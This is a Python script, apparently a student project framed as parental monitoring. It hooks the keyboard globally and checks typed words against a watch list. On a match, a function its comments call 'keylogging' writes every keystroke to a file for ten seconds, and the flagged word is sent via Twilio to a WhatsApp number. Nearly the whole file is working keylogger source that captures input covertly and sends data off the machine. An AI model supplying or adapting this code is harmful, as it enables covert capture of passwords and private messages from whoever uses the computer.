import keyboard
import difflib
from twilio.rest import Client

def load_word_list(file_path):
    with open(file_path, 'r') as file:
        word_list = file.read().split()
    return word_list

def check_word_in_list(typed_word, word_list):
    if typed_word in word_list:
        print(f"Success! '{typed_word}' is in the word list.")
        return True
    else:
        close_matches = difflib.get_close_matches(typed_word, word_list)
        if close_matches:
            print(f"Typed word '{typed_word}' is close to: {', '.join(close_matches)}")
        return False

import time

# Function for keylogging
def impo(typed_word):
    log_file = 'E:\\Adv network project\\output.txt'  
    print("Keylogging started... Press 'Esc' to stop.")
    with open(log_file, 'a') as file:
        file.write("Keylogging started:\n")
    def on_key(event):
        with open(log_file, 'a') as file:
            if event.name == 'esc':
                file.write("\nKeylogging stopped.")
                keyboard.unhook_all()
            else:
                if event.name == 'space':
                    file.write(" ")
                elif event.name == 'backspace':
                    file.write("[backspace]")
                else:
                    file.write(event.name)
    keyboard.on_release(on_key)
    # Set timer for 10 seconds
    start_time = time.time()
    while time.time() - start_time < 10:
        pass
    keyboard.unhook_all()
    print("Keylogging stopped.")
    # Call whatsapp_transfer function after keylogging and pass the searched word
    whatsapp_transfer(typed_word)
    print("Sending whatsapp message")

def whatsapp_transfer(searched_word):
    # Your Twilio credentials
    account_sid = '###'
    auth_token = '###'
    # Initialize Twilio client
    client = Client(account_sid, auth_token)
    # Compose the message body with the searched word
    message_body = f"Your kid searched for: {searched_word}"
    # Send the message to WhatsApp
    message = client.messages.create(to='whatsapp:#parent_number', from_='whatsapp:+14###', body=message_body)
    print("Message sent successfully")

def main():
    file_path = "E:\\Adv network project\\words.txt"
    word_list = load_word_list(file_path)
    print("Monitoring keyboard... Press 'Esc' to exit.")
    typed_word = ""  
    while True:
        event = keyboard.read_event(suppress=True)
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == 'esc':
                print("Exiting...")
                break  
            elif event.name == 'space':
                if typed_word:
                    if check_word_in_list(typed_word, word_list):
                        impo(typed_word)
                        typed_word = ""  
                    else:
                        print(f"Typed word '{typed_word}' is not in the word list.")
                        typed_word = ""  
            elif event.name.isalpha():
                typed_word += event.name.lower()  

if __name__ == "__main__":
    main()
